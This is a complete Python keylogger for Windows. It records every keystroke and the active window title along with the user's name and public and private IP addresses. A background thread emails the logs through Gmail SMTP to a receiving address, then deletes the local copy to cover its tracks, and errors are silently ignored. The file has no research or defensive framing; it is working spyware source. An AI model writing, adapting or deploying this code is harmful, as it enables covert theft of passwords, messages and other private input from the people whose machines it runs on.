from pynput.keyboard import Key, Listener
import time
import os
import requests
import socket
import win32gui
import credentials
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

absoluteTime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

log = f'[START OF LOGS]\n  *~ Date/Time: {absoluteTime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
displayData = []
displayData.append(log)

currentApp = ''
toDeleteFile = []


def on_press(key):
    global currentApp

    nextApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if nextApp == 'Cortana':
        nextApp = 'Windows search bar'
    else:
        pass

    if nextApp != currentApp and nextApp != '':
        displayData.append(f'[{absoluteTime}] ~ {nextApp}\n')
        currentApp = nextApp
    else:
        pass

    unclear_keys = {'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
                    'Key.alt_l': '[ALT]', 'Key.tab': '[TAB]', 'Key.delete': '[DEL]', 'Key.ctrl_l': '[CTRL]',
                    'Key.left': '[LEFT ARROW]', 'Key.right': '[RIGHT ARROW]', 'Key.shift': '[SHIFT]', '\\x13':
                        '[CTRL-S]', '\\x17': '[CTRL-W]', 'Key.caps_lock': '[CAPS LK]', '\\x01': '[CTRL-A]', 'Key.cmd':
                        '[WINDOWS KEY]', 'Key.print_screen': '[PRNT SCR]', '\\x03': '[CTRL-C]', '\\x16': '[CTRL-V]'}

    key = str(key).strip('\'')

    if key in unclear_keys:
        displayData.append(unclear_keys[key])
    else:
        displayData.append(key)

def write_file():
    savingLocation = os.path.expanduser('~') + '/Downloads/' #Choosing the destination where we want the .txt file to be written
    fileName = 'log.txt'
    file = savingLocation + fileName
    toDeleteFile.append(file)                                #Saving the file so that we can delete it once we've emailed ourself

    with open(file, 'w') as writingFile:
        writingFile.write(''.join(displayData))
    print('Success writing to file')

def send_logs():
    count = 0

    sendEmail = credentials.sendfromEmail
    sendPassword = credentials.sendfromPassword

    receiveEmail = credentials.receiveEmail

    MIN = 10
    SECONDS = 60
    time.sleep(20)

    while True:
        if len(displayData) > 1:
            try:
                write_file()

                subject = f'["Log of "{user}] ~ {count}'

                log = MIMEMultipart()
                log['From'] = sendEmail
                log['To'] = receiveEmail
                log['Subject'] = subject
                body = 'testing'
                log.attach(MIMEText(body, 'plain'))

                attachment = open(toDeleteFile[0], 'rb')
                print('sending the log text file as attachment')

                filename = toDeleteFile[0].split('/')[2]

                part = MIMEBase('application', 'octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
                log.attach(part)

                text = log.as_string()

                setup = smtplib.SMTP('smtp.gmail.com', 587)
                setup.ehlo()
                setup.starttls()
                print('starttls here: ')

                setup.ehlo()
                setup.login(sendEmail, sendPassword)
                setup.sendmail(sendEmail, receiveEmail, text)
                print('Sent to the provided email', receiveEmail)

                attachment.close()
                setup.close()

                os.remove(toDeleteFile[0])
                del displayData[1:]
                del toDeleteFile[0:]
                print("deleting the log once we've sent to our email")

            except:
                pass


if __name__=='__main__':
	thread = threading.Thread(target=send_logs)
	thread.start()

	with Listener(on_press=on_press) as listener:
		listener.join()